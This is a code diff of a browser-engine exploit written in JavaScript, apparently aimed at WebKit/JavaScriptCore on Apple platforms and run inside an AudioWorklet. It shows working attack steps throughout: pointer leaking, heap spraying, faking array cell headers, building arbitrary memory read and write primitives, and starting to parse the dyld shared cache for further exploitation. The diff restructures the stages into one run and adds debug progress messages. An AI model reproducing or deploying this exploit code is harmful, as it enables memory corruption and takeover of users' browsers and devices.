@@ -612,7 +612,7 @@ b.process = (inputs, outputs, parameters)=>{
 };*/
     fuck.port.postMessage("starting");
     
-    if(stage == "leak"){
+    
         var expected_ptr = (BigInt(floatAsQword(c[4])) & 0xFFFFFFFFFFF00000n) - 0x100000n;
         expected_ptr = Number(expected_ptr);
         c[8] = qwordAsFloat(expected_ptr + 0x4010);
@@ -620,11 +620,10 @@ b.process = (inputs, outputs, parameters)=>{
         stage  = "bypass_etc";
         fuck.port.postMessage(c);
         //sleep(4000);
-        return true;
-    }
-    if(stage == "bypass_etc"){
-        //fuck.port.postMessage(typeof parameters);
-         var gcPreventer = [];
+        
+    
+        fuck.port.postMessage("spraying structures *unstable*");
+        var gcPreventer = [];
         for (let i = 0; i < 2; i++) {
             let a = i == 0 ? parameters : victim;
             gcPreventer.push(a[0]);
@@ -658,10 +657,9 @@ b.process = (inputs, outputs, parameters)=>{
         evil_arr[0] = cellHeader;
         evil_arr[1] = qwordAsFloat(evil_arr_butterfly-0x8);
 
-        stage = "r/w";
-        return true;
-    }
-    if(stage == "r/w"){
+        
+    
+    
         for(var i =0; i < 2; i++){
             let a = i == 0 ? parameters: pad;
             a[0] = qwordAsFloat(0x133700001337);
@@ -705,7 +703,7 @@ b.process = (inputs, outputs, parameters)=>{
     var convert = new ArrayBuffer(0x10);
     var u32 = new Uint32Array(convert);
     var f64 = new Float64Array(convert);
-
+    fuck.port.postMessage("about to fake double array");
     // Setup flag values for ArrayWithDouble & ArrayWithContiguous
     u32[0] = 0x200; 
     u32[1] = 0x01082007 - 0x10000;
@@ -750,7 +748,7 @@ b.process = (inputs, outputs, parameters)=>{
     // Change hax[] from an ArrayWithContiguous into an ArrayWithDouble
     // This is necessary inorder to avoid boxing our values below when using hax[]
     outer.cell_header = flag_dbl;
-
+    fuck.port.postMessage("success done 20%");
     // Arbitrary read
     read64 = function(ptr) {
         f64[0] = ptr;
@@ -769,17 +767,14 @@ b.process = (inputs, outputs, parameters)=>{
     fuck.port.postMessage("[+] limited memory read/write working");
         
         
-        stage="gc_test"
-        return true;
-    }
-    if(stage=="gc_test"){
+        
+    
         gc();
         fuck.port.postMessage(`Garbage Collected`);
         //sleep(100000);
-        stage = "wasmfaker";
-        return true;
-    }
-    if (stage=="wasmfaker") {
+        
+        
+    
     debugger;
     let fail = function fail(x)
     {
@@ -789,11 +784,9 @@ b.process = (inputs, outputs, parameters)=>{
     }
         var print1 = fuck.port.postMessage();
      
-        stage = "parsecache";
-        return true;
-    }
-    if(stage =="parsecache") {
-        print1(`success now about to parse dyld shared cache...`);
+        
+    
+        print1("success now about to parse dyld shared cache...");
         memory.read64 = read64;
         memory.write64 = write64;
         memory.u32 = _u32;
@@ -847,9 +840,9 @@ b.process = (inputs, outputs, parameters)=>{
        };*/
        
        print1("dyld cache header @" + hdr); //dyld_cache_header
-    }
+    
     //  sleep(2000);
-   return true;
+       return true;
 }
 class OrigineWorklet extends AudioWorkletProcessor {
     constructor(){
